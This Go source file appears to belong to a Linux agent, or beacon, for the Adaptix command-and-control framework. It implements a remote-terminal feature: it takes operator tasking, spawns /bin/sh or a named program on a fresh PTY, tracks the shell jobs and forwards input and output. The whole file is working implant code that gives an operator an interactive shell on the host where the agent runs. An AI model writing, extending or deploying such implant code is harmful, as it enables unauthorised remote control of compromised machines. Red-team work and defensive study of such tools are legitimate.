package main

import (
	"os"
	"os/exec"
	"sync"
	"syscall"
)

// terminalManager tracks PTY backed shell jobs (Adaptix "Remote Terminal").
type terminalManager struct {
	mu sync.Mutex
	m  map[uint32]*job
}

func newTerminalManager() *terminalManager {
	return &terminalManager{m: make(map[uint32]*job)}
}

func (tm *terminalManager) add(j *job) {
	tm.mu.Lock()
	tm.m[j.id] = j
	tm.mu.Unlock()
}

func (tm *terminalManager) get(id uint32) *job {
	tm.mu.Lock()
	defer tm.mu.Unlock()
	return tm.m[id]
}

func (tm *terminalManager) remove(id uint32) {
	tm.mu.Lock()
	delete(tm.m, id)
	tm.mu.Unlock()
}

func (tm *terminalManager) closeAll() {
	tm.mu.Lock()
	jobs := make([]*job, 0, len(tm.m))
	for _, j := range tm.m {
		jobs = append(jobs, j)
	}
	tm.mu.Unlock()
	for _, j := range jobs {
		killProcessGroup(j)
	}
}

// startShell spawns program on a fresh PTY. This is the Linux equivalent of
// the named-pipe backed cmd.exe job used by the Windows beacon.
func (a *agent) startShell(id uint32, program string, sizeH, sizeW int) error {
	argv := splitCommandLine(program)
	if len(argv) == 0 {
		argv = []string{"/bin/sh"}
	}

	master, slave, err := openPTY()
	if err != nil {
		return err
	}
	if sizeH > 0 && sizeW > 0 {
		_ = setWinsize(master, sizeH, sizeW)
	}

	cmd := exec.Command(argv[0], argv[1:]...)
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
	cmd.Stdin = slave
	cmd.Stdout = slave
	cmd.Stderr = slave
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true,
		Ctty:    0,
	}

	if err := cmd.Start(); err != nil {
		_ = master.Close()
		_ = slave.Close()
		return err
	}
	_ = slave.Close()

	j := &job{id: id, jtype: jobTypeShell, pid: cmd.Process.Pid, cmd: cmd, master: master}
	a.term.add(j)
	a.jobs.add(j)
	go a.pumpJob(j, master)
	return nil
}

func (a *agent) cmdShellStart(r *reader) {
	shellID := r.u32()
	program := r.str()
	sizeH := int(r.u32())
	sizeW := int(r.u32())
	_ = r.u32() // trailing task id (unused: the shell id doubles as job id)

	if err := a.startShell(shellID, program, sizeH, sizeW); err != nil {
		code := uint32(errnoOf(err))
		a.out.emit(func(w *writer) {
			w.u32(shellID)
			w.u32(cmdJob)
			w.u8(jobTypeShell)
			w.u8(jobStateFinished)
			w.u32(code)
		})
		a.term.remove(shellID)
		return
	}

	a.out.emit(func(w *writer) {
		w.u32(shellID)
		w.u32(cmdJob)
		w.u8(jobTypeShell)
		w.u8(jobStateStarting)
	})
}

func (a *agent) cmdShellWrite(r *reader) {
	shellID := r.u32()
	data := r.bytes()
	_ = r.u32() // trailing task id

	j := a.term.get(shellID)
	if j == nil {
		return
	}
	j.mu.Lock()
	master := j.master
	j.mu.Unlock()
	if master == nil {
		return
	}
	_, _ = master.Write(data)
}
